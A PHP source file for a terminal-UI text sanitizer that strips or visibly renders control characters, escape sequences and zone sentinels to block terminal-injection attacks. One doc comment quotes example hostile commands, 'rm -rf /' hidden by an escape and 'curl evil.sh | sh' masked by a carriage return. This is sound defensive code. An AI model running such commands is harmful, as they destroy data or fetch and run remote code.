<?php

declare(strict_types=1);

namespace SugarCraft\Core\Util;

/**
 * Canonical text sanitizer for TUI components — the single source of truth
 * for neutralizing terminal-control-sequence injection across SugarCraft.
 *
 * Terminal control sequence injection is a real TUI attack vector: a raw
 * ESC (0x1b) desyncs the frame-diff renderer's line model, NUL/control
 * bytes garble the terminal, and BEL makes it beep on every repaint. This
 * class is the one place to audit that risk. Several policies are offered,
 * differing in how much they preserve:
 *
 *   - {@see controlChars()} — strips C0 controls (ESC included) and maps
 *     \n \r \t to spaces; the printable SGR parameter text is left behind.
 *   - {@see cellValue()}    — glyph-replacement + UTF-8 repair for data grids.
 *   - {@see untrusted()}    — full ANSI strip for plain-text module sinks,
 *     C1 controls removed in both their raw 8-bit and UTF-8-encoded forms.
 *   - {@see untrustedForMarkedFrames()} — {@see untrusted()} plus the zone
 *     sentinel strip, for text destined for a frame that carries candy-mouse
 *     zone markup. The Private-Use codepoints it removes are the reason a
 *     separate policy is needed: see the reservation note below.
 *   - {@see untrustedForDisplay()} — {@see untrusted()} plus carriage-return
 *     mapping (CRLF and lone CR → LF), for text painted into a row-addressed
 *     frame. A surviving CR returns the cursor to column 0 mid-row, which no
 *     line-oriented renderer can account for.
 *   - {@see visibleControls()} — the opposite stance: nothing is removed, every
 *     control is RENDERED as inert visible text (caret notation for C0 and DEL,
 *     `<U+0080>`…`<U+009F>` for C1) and invalid UTF-8 is repaired to U+FFFD.
 *     For a gate — a permission prompt, a confirmation — where the user must
 *     see exactly what they are approving, and a strip would hide part of it.
 *
 * **The Private-Use reservation.** A TUI frame is not only text: candy-mouse's
 * `Mark`/`Scan` delimit clickable zones with the sentinel pair U+E000 (open) and
 * U+E001 (close), and {@see \SugarCraft\Core\ImageOverlay} allocates its image
 * marker cells from the rest of the block (U+E002 + id) — the sentinels own the
 * two codepoints at the head, so the two marker vocabularies are disjoint by
 * construction. Those codepoints are
 * ordinary, well-formed 3-byte UTF-8, so {@see untrusted()} — whose vocabulary
 * is escapes, C0/C1 (raw or UTF-8-encoded) and DEL — passes hostile input
 * carrying them straight
 * through. Text that reaches a zone-scanned frame therefore needs the sentinel
 * sweep of {@see stripZoneSentinels()} on top, or a model reply can forge zone
 * markup (attacker-chosen click targets) or break the zone parse outright.
 *
 * No single upstream counterpart is cited here because this class is a
 * SugarCraft-original assembled from three separate internal predecessors, not a
 * port (candy-core's ported upstream is `charmbracelet/bubbletea`, an
 * Elm-architecture TUI runtime with no text sanitizer — see `docs/MATCHUPS.md`):
 *   - `controlChars()` — extracted from sugar-bits' per-cell `sanitizeCell`
 *     helper (commit 114118393);
 *   - `cellValue()` — byte-identical to candy-query's `CellValue::sanitize()`
 *     (commit 8ac981ebf);
 *   - `untrusted()` — ported from sugar-dash (commit 8ac981ebf).
 * Consolidating them gives every component one audited injection boundary.
 * Provenance: `git log --follow -- candy-core/src/Util/Sanitize.php`.
 */
final class Sanitize
{
    /**
     * First codepoint of the Basic Multilingual Plane Private Use Area — the
     * block SugarCraft reserves for in-frame markup (zone sentinels, image
     * markers). Pinned against {@see \SugarCraft\Core\ImageOverlay}'s marker
     * window so the two allocations stay auditable from one place.
     */
    public const PUA_BMP_FIRST = 0xE000;

    /** Last codepoint of the reserved BMP Private Use Area (U+F8FF). */
    public const PUA_BMP_LAST = 0xF8FF;

    /** U+E000 — the zone-OPEN sentinel candy-mouse's Mark emits / Scan parses. */
    public const ZONE_SENTINEL_OPEN = "\xEE\x80\x80";

    /** U+E001 — the zone-CLOSE sentinel candy-mouse's Mark emits / Scan parses. */
    public const ZONE_SENTINEL_CLOSE = "\xEE\x80\x81";

    /**
     * UTF-8 spellings of the whole U+E000–U+F8FF block, matched byte-wise.
     *
     * No `/u` flag on purpose, for the same reason {@see untrusted()}'s C0 sweep
     * has none: a Unicode-mode match FAILS (returns null) on input carrying a
     * single malformed sequence, and any fallback then hands the hostile bytes
     * back. These three-byte shapes cannot occur inside another character, so
     * the byte scan is both exact for well-formed input and fail-closed for
     * broken input — it can only ever over-match a stray 0xEE/0xEF lead byte,
     * which is the safe direction for a strip.
     */
    private const PUA_BMP_PATTERN = '/\xEE[\x80-\xBF][\x80-\xBF]|\xEF[\x80-\xA3][\x80-\xBF]/';

    // Visible stand-in for a neutralized control byte: · (U+00B7 MIDDLE DOT).
    private const CELL_REPLACEMENT = "\xC2\xB7";

    // Visible stand-in for a collapsed newline: ↵ (U+21B5 DOWNWARDS ARROW
    // WITH CORNER LEFTWARDS). Reads as "line ended here" — chosen over → so
    // the glyph carries its return semantics.
    private const NEWLINE_GLYPH = "\xE2\x86\xB5";

    /**
     * Strip C0 control characters from caller-supplied text so they cannot
     * inject newlines or corrupt the TUI render. NOT an escape-sequence
     * stripper, and NOT SGR-preserving — read the contract below before
     * "fixing" the code to match a memory of these docs.
     *
     * Contract (pinned byte-for-byte by `SanitizeTest`):
     *   - `\n`, `\r`, `\t` each fold to exactly one space (0x20).
     *   - Every other C0 byte — `\x00`-`\x08`, `\x0b`, `\x0c`, `\x0e`-`\x1f` —
     *     is deleted. ESC (0x1b) falls inside that last range and is therefore
     *     deleted too.
     *   - DEL (0x7f) and the C1 range (0x80-0x9f, as raw bytes or as UTF-8
     *     code points) pass through untouched. That is a declared scope
     *     boundary, not an oversight — see the siblings below.
     *
     * Why ESC is dropped rather than preserved: no default policy over
     * arbitrary caller-supplied text may keep the escape introducer alive. A
     * surviving ESC lets that text open a CSI/OSC/DCS sequence of the
     * attacker's choosing, and desynchronises the frame-diff renderer's line
     * model — the exact injection this class exists to close. Preserving SGR
     * here would trade a proven defence for a cosmetic convenience. What
     * survives of `\x1b[31m` is the inert printable text `[31m`: ugly in a
     * label, but never re-interpreted by a terminal. Components that want
     * styled output sanitize the PLAIN text and apply their own SGR after
     * (see sugar-bits `Help`, `Tabs`, `Table`), never before.
     *
     * Need more than a C0 sweep? Pick the hardened sibling rather than
     * widening this method — the gap matters most for 8-bit input, where a raw
     * `\x9b` survives this method as a fully functional CSI introducer:
     *   - {@see untrusted()} — removes whole escape sequences and the lone C1
     *     controls inside {@see Ansi::strip()}, then the remaining C0 controls,
     *     DEL and the UTF-8-encoded C1 codepoints. It is NOT single-line: TAB, LF and CR pass through by
     *     design, so a caller that needs one line must fold newlines itself.
     *     The policy for terminal-bound text from a process, socket, or user.
     *   - {@see cellValue()} — replaces C0, DEL and C1 with a visible stand-in
     *     (· for controls, ↵ for collapsed newlines, U+FFFD for undecodable
     *     bytes) and repairs invalid UTF-8. The policy for cell grids.
     *
     * @param string $s Caller-supplied text.
     * @return string Single-line text: no C0 bytes, no ESC, unchanged payload
     *                bytes outside those ranges.
     */
    public static function controlChars(string $s): string
    {
        $s = str_replace(["\n", "\r", "\t"], ' ', $s);
        return preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f]/', '', $s) ?? $s;
    }

    /**
     * Turn an arbitrary already-stringified cell value into something safe
     * for a cell-grid renderer: repair invalid UTF-8, collapse (or preserve)
     * newlines, and replace every remaining control byte with a visible dot.
     *
     * Invalid UTF-8 bytes become U+FFFD rather than being silently dropped,
     * so binary/BLOB data keeps a 1:1 visible stand-in and downstream
     * width/truncation math stays sane. This is the canonical policy that
     * the sugar-table and candy-query grids share.
     *
     * @param string $value            Raw, already-stringified cell value.
     * @param bool   $preserveNewlines When true, keep line breaks as "\n" so
     *                                  multiline callers can explode() on them;
     *                                  when false, collapse every newline
     *                                  variant to the ↵ glyph (single line).
     * @return string Sanitized string safe for the terminal buffer.
     */
    public static function cellValue(string $value, bool $preserveNewlines = false): string
    {
        // 1. Repair invalid UTF-8 (binary data) so width/truncation stay sane.
        //    Malformed bytes are substituted with U+FFFD, not dropped, keeping
        //    a visible marker where corrupted bytes were.
        $value = self::repairUtf8($value);

        // 2. Handle newlines FIRST — before the C0 sweep — because \n (0x0A)
        //    and \r (0x0D) live in the C0 block and would otherwise be caught
        //    below. The two branches also differ in which C0 sweep follows, so
        //    that \n survives only when the caller asked to preserve it.
        if ($preserveNewlines) {
            // Multiline: normalize CRLF/CR to LF for consistent explode("\n").
            $value = str_replace(["\r\n", "\r"], "\n", $value);
            // C0 + DEL sweep that spares the LF we just normalized.
            $value = preg_replace('/[\x00-\x09\x0B-\x1F\x7F]/', self::CELL_REPLACEMENT, $value) ?? $value;
        } else {
            // Single-line: collapse every newline variant to the ↵ glyph.
            $value = str_replace(["\r\n", "\r", "\n"], self::NEWLINE_GLYPH, $value);
            // C0 + DEL sweep over everything that remains (no newline survivors).
            $value = preg_replace('/[\x00-\x1F\x7F]/', self::CELL_REPLACEMENT, $value) ?? $value;
        }

        // 3. Neutralize the C1 control range (U+0080–U+009F), now valid UTF-8.
        //    The /u flag matches code points, not raw continuation bytes.
        $value = preg_replace('/[\x{0080}-\x{009F}]/u', self::CELL_REPLACEMENT, $value) ?? $value;

        return $value;
    }

    /**
     * Strip all C0 control bytes (\x00–\x1f) and C1 (\x80–\x9f)
     * except \t (\x09), \n (\x0a) and \r (\x0d), and remove every escape
     * sequence — CSI/OSC/SGR introduced by \x1b, the 8-bit C1 forms
     * (\x9b CSI, \x90 DCS, \x9d OSC, \x9f APC …), and string-sequence
     * payloads (DCS/SOS/PM/APC, sixel and Kitty included).
     *
     * C1 is removed in BOTH spellings: the lone raw byte (\x9b) and the
     * well-formed UTF-8 encoding of the same codepoint U+0080–U+009F
     * (\xC2\x9B). xterm and other UTF-8 terminals decode the latter to the
     * C1 codepoint and then execute it, so `U+009B 2 J` clears the screen
     * exactly like `ESC [ 2 J`. Only the introducer is dropped — the
     * printable tail (`2J`) is inert text without it. Valid text is untouched:
     * U+00A0 and up (\xC2\xA0…), and multi-byte characters whose
     * continuation bytes merely fall in the 0x80–0x9F numeric range (→, 😀),
     * all survive.
     *
     * Use this on any string that originates from an external process,
     * network response, or user-controlled source before writing to the
     * terminal. Versus {@see controlChars()}: on 7-bit input both guarantee no
     * ESC survives and the difference is residue — that method deletes the ESC
     * introducer (and an OSC's BEL terminator, being C0) but leaves the
     * sequence's printable body behind as inert text (`\x1b[31m` → `[31m`),
     * and it keeps DEL, which this one deletes. On 8-bit input the difference
     * is safety: a raw `\x9b` passes `controlChars()` untouched and still acts
     * as a live CSI introducer, so only here is plain text actually delivered.
     * Neither preserves ESC-introduced SGR, and plain-text sinks render no
     * colour either way, so the full strip costs nothing.
     *
     * Declared scope boundary: Private-Use codepoints are well-formed text, not
     * control bytes, so U+E000–U+F8FF survives this method. That is fine for a
     * plain-text sink and unsafe for a frame carrying candy-mouse zone markup —
     * for the latter use {@see untrustedForMarkedFrames()}, or add
     * {@see stripZoneSentinels()} to a path that must keep other PUA glyphs.
     *
     * @param string $s Untrusted input string
     * @return string Sanitized string safe for terminal output
     */
    public static function untrusted(string $s): string
    {
        // Step 1: remove every escape sequence in 7-bit and 8-bit form,
        // including DCS/APC/PM/SOS payloads and lone C1 controls. The
        // UTF-8-aware lone-C1 rule (a 0x80-0x9f byte counts as a control
        // only when it does not continue a lead byte 0xC0-0xF7) lives in
        // Ansi::strip() so the sanitizer and the width math cannot diverge.
        $stripped = Ansi::strip($s);

        // Step 2: strip the remaining C0 control bytes, DEL, and the
        // UTF-8-encoded C1 codepoints U+0080-U+009F.
        // Preserved: TAB (0x09), LF (0x0a), CR (0x0d).
        // Dropped: NUL..BS (0x00-0x08), VT (0x0b), FF (0x0c),
        //          SO..US (0x0e-0x1f), DEL (0x7f), \xC2\x80-\xC2\x9F.
        //
        // Ansi::strip() keeps \xC2\x9B because it is well-formed UTF-8 —
        // correct for its width math, but the terminal decodes it to U+009B
        // and runs it as CSI, so the sanitizer must drop it here.
        //
        // Byte-oriented on purpose (NO /u flag): a /u pattern FAILS on
        // invalid UTF-8 — and the old `?? $stripped` fallback then let every
        // C0 control (BEL included) through, so one malformed byte anywhere
        // would also switch the C1 sweep off. Fail-closed beats
        // fallback-to-hostile. The byte form is still exact: the ASCII class
        // never occurs inside a multi-byte sequence, and \xC2 is only ever a
        // lead byte, so `\xC2[\x80-\x9F]` cannot split a valid character.
        // Nor can a removal splice a new C1 pair together: step 1 already
        // deleted every 0x80-0x9F byte that is not a continuation of a
        // well-formed run, and removing whole ASCII bytes or whole 2-byte
        // characters never separates a continuation from its lead.
        return preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]|\xC2[\x80-\x9F]/', '', $stripped) ?? '';
    }

    /**
     * {@see untrusted()} plus carriage-return mapping: every `\r\n` becomes
     * `\n`, and every remaining lone `\r` becomes `\n` too. The policy for
     * untrusted text painted into a frame that is laid out one logical line
     * per terminal row.
     *
     * Why CR cannot simply survive there, as {@see untrusted()} lets it: CR is
     * not a character but a cursor motion. It returns the cursor to column 0
     * of the CURRENT physical row, so whatever follows it overwrites whatever
     * the frame already painted to its left — a neighbouring pane, a border,
     * a permission label. The frame string still looks like one row, so a
     * width- or diff-based renderer has no way to see the damage. And CR is
     * the common case, not an exotic one: every progress bar (`git clone`,
     * `npm install`, `curl`) redraws its line with it, and CRLF is the line
     * ending of every Windows-authored file.
     *
     * Why MAPPED to LF rather than dropped: dropping CR would splice the text
     * either side of it into one run (`visible\rHIDDEN` → `visibleHIDDEN`),
     * misrepresenting what was printed, and a progress bar's frames would read
     * as one garbled line. As a line break every byte of the payload stays on
     * screen, nothing is hidden, and the result agrees with consumers that
     * already split on `\r\n|\r|\n` (sugar-crush's collapsed tool output,
     * {@see cellValue()} with `$preserveNewlines`). A caller that needs a
     * single row still folds LF itself, exactly as with {@see untrusted()}.
     *
     * Deliberately a separate method rather than a change to
     * {@see untrusted()} / {@see untrustedForMarkedFrames()}: those keep CR by
     * contract, and some consumers depend on it — terminals send a pasted
     * newline as CR, and {@see \SugarCraft\Core\InputReader}'s paste path
     * hands that payload to the application with its line endings exactly as
     * typed; normalising them is the application's call, not the boundary's.
     *
     * Runs after the {@see untrusted()} sweep so a CR exposed by a removed
     * control (`\r\x07\n` → `\r\n`) is still collapsed to one break; the
     * mapping is a byte-level `str_replace`, so invalid UTF-8 cannot turn it
     * into a no-op.
     *
     * @param string $s Untrusted input string.
     * @return string {@see untrusted()}'s output with no CR left in it.
     */
    public static function untrustedForDisplay(string $s): string
    {
        return str_replace(["\r\n", "\r"], "\n", self::untrusted($s));
    }

    /**
     * Render every control character in `$s` as inert, visible text instead of
     * removing it — the `cat -v` convention — so the result shows the user
     * every byte the input carried and the terminal interprets none of them.
     *
     * Contract (pinned byte-for-byte by `SanitizeVisibleControlsTest`):
     *   - Invalid UTF-8 is repaired first: every malformed byte becomes U+FFFD,
     *     exactly as in {@see cellValue()}. A lone raw C1 byte (`\x9b`, an 8-bit
     *     CSI introducer) is malformed UTF-8, so it is shown as U+FFFD too.
     *   - C0 controls become caret notation — the byte plus 0x40 after a `^`:
     *     NUL `^@`, BEL `^G`, BS `^H`, VT `^K`, FF `^L`, CR `^M`, ESC `^[`,
     *     … US `^_`. DEL becomes `^?`.
     *   - C1 codepoints U+0080–U+009F (well-formed `\xC2\x80`–`\xC2\x9F`)
     *     become `<U+0080>`…`<U+009F>` — upper-case hex, four digits. Caret
     *     notation has no C1 form (`cat -v`'s `M-^[` describes a BYTE, which
     *     after the repair above is no longer what is on hand), and a
     *     codepoint name is unambiguous to a reader who looks it up.
     *   - TAB and LF are kept as themselves when `$preserveLayout` is true (the
     *     default), so multi-line text keeps its shape; the caller expands or
     *     wraps them. With `$preserveLayout` false they become `^I` / `^J` too
     *     and the result is guaranteed to be one row.
     *   - Everything else — every printable character, the Private Use Area,
     *     astral codepoints — passes through unchanged.
     *
     * Why visible rather than stripped: every other policy in this class
     * protects the FRAME, and is free to throw text away to do it. A gate has
     * the opposite duty — `rm -rf /\x1b[8mhidden` (SGR 8 = concealed),
     * `curl evil.sh | sh #\recho ok` (CR repaints the row), `\xC2\x9B2J`
     * (C1 CSI) are commands whose display must not differ from what will run.
     * A strip still shows something different from the input (`[8m` with no
     * marker that an escape was there; `visibleHIDDEN` spliced together); a
     * visible rendering cannot hide or reinterpret a single byte, and an
     * escape sequence shows as the honest inert text `^[[8m`. A literal `^[`
     * typed by the input is indistinguishable from an escaped ESC — the same
     * ambiguity `cat -v` accepts — but that can only ever make text look MORE
     * suspicious, never less.
     *
     * Why CR is shown (`^M`) rather than mapped to LF as
     * {@see untrustedForDisplay()} does: this method promises to render what
     * the bytes ARE. A caller whose surface treats CR as a line break (a
     * multi-line prompt body) maps CRLF/CR to LF itself before calling.
     *
     * Not in scope: Private-Use zone sentinels (U+E000/U+E001) are text, not
     * controls, and pass through — a caller painting into a zone-scanned frame
     * must still neutralise them ({@see stripZoneSentinels()}).
     *
     * Byte-oriented and fail-closed like the rest of the class: the repair
     * leaves only well-formed UTF-8, where an ASCII byte never occurs inside a
     * multi-byte character and `\xC2` is only ever a lead byte, so the `strtr()`
     * map cannot split a character; and `strtr()` has no failure mode that
     * could hand the input back unchanged, as a failed `/u` regex can.
     *
     * @param string $s              Untrusted text to display verbatim.
     * @param bool   $preserveLayout Keep TAB and LF as themselves (true) or
     *                               render them as `^I` / `^J` (false).
     * @return string Valid UTF-8 containing no control character except, when
     *                `$preserveLayout` is true, TAB and LF.
     */
    public static function visibleControls(string $s, bool $preserveLayout = true): string
    {
        if ($s === '') {
            return '';
        }

        $map = self::visibleControlMap();
        if ($preserveLayout) {
            unset($map["\t"], $map["\n"]);
        }

        return strtr(self::repairUtf8($s), $map);
    }

    /**
     * Every control {@see visibleControls()} renders, mapped to its visible
     * spelling: C0 + DEL in caret notation, C1 as `<U+00XX>`. Built once.
     *
     * @return array<string, string>
     */
    private static function visibleControlMap(): array
    {
        static $map = null;
        if ($map === null) {
            $map = [];
            for ($b = 0x00; $b <= 0x1F; $b++) {
                $map[\chr($b)] = '^' . \chr($b + 0x40);
            }
            $map["\x7F"] = '^?';
            for ($cp = 0x80; $cp <= 0x9F; $cp++) {
                $map["\xC2" . \chr($cp)] = \sprintf('<U+%04X>', $cp);
            }
        }

        return $map;
    }

    /**
     * Replace every malformed UTF-8 sequence in `$s` with U+FFFD, leaving
     * well-formed input byte-identical. Shared by {@see cellValue()} and
     * {@see visibleControls()} so the two visible-stand-in policies repair
     * identically.
     */
    private static function repairUtf8(string $s): string
    {
        if (mb_check_encoding($s, 'UTF-8')) {
            return $s;
        }

        $prev = mb_substitute_character();
        mb_substitute_character(0xFFFD); // U+FFFD REPLACEMENT CHARACTER
        $s = mb_convert_encoding($s, 'UTF-8', 'UTF-8');
        mb_substitute_character($prev);

        return $s;
    }

    /**
     * Remove the zone sentinel pair (U+E000 / U+E001) from text, leaving every
     * other codepoint — including the rest of the Private Use Area — alone.
     *
     * This is the security half of "untrusted text may not speak the zone
     * language". Zone markup needs a sentinel at both ends, so with neither able
     * to survive this sweep, injected input can neither register an
     * attacker-chosen click target in the hit-test registry nor forge the
     * duplicate/unclosed ids that make the zone parse throw. What is left of a
     * forged `U+E000 id U+E001` triple is its inert id text.
     *
     * Deliberately surgical rather than block-wide: image marker cells
     * ({@see \SugarCraft\Core\ImageOverlay}, U+E002 + id, disjoint from the
     * sentinel pair) and Nerd Font glyphs
     * share the block and must keep flowing through a display path. Callers that
     * want a guaranteed PUA-free string use {@see stripPrivateUse()}.
     *
     * `str_replace` on the literal byte spellings, never a `/u` regex: the same
     * fail-closed law as {@see untrusted()} — malformed UTF-8 must not be able to
     * turn the strip into a no-op.
     *
     * @param string $s Text about to be painted into a zone-marked frame.
     * @return string The same text with every zone sentinel removed.
     */
    public static function stripZoneSentinels(string $s): string
    {
        return str_replace([self::ZONE_SENTINEL_OPEN, self::ZONE_SENTINEL_CLOSE], '', $s);
    }

    /**
     * Remove every Basic Multilingual Plane Private Use codepoint
     * (U+E000–U+F8FF) — the whole arena SugarCraft allocates markup from.
     *
     * The blunt instrument: for a surface that renders no images and no patched-
     * font glyphs, this is the strongest guarantee that no foreign markup reaches
     * a zone scanner. Softer callers that must keep U+E002-and-up image markers or
     * icon fonts alive use {@see stripZoneSentinels()}. Supplementary-plane PUA
     * (U+F0000…U+10FFFD, where Nerd Fonts put most of their glyphs) is NOT touched
     * — it cannot form zone markup, so stripping it would cost glyphs for nothing.
     *
     * @param string $s Text to render PUA-free.
     * @return string The same text with the BMP Private Use block removed.
     */
    public static function stripPrivateUse(string $s): string
    {
        return preg_replace(self::PUA_BMP_PATTERN, '', $s) ?? '';
    }

    /**
     * The policy for text that originated outside this process AND lands in a
     * frame carrying candy-mouse zone markup: {@see untrusted()} plus
     * {@see stripZoneSentinels()}.
     *
     * {@see untrusted()} alone is not enough there, because a Private-Use
     * sentinel is well-formed text with no control meaning to the ANSI sweep —
     * hostile model or tool output carrying it would reach the zone parser
     * verbatim. Composing the two here keeps the predicate in one audited place
     * instead of re-rolled per application.
     *
     * Order matters only for readability: the ANSI/C0 sweep cannot create
     * sentinels, and the sentinel sweep cannot create escapes.
     *
     * @param string $s Untrusted text destined for a zone-marked frame.
     * @return string Terminal-safe text with no zone sentinels left.
     */
    public static function untrustedForMarkedFrames(string $s): string
    {
        return self::stripZoneSentinels(self::untrusted($s));
    }
}
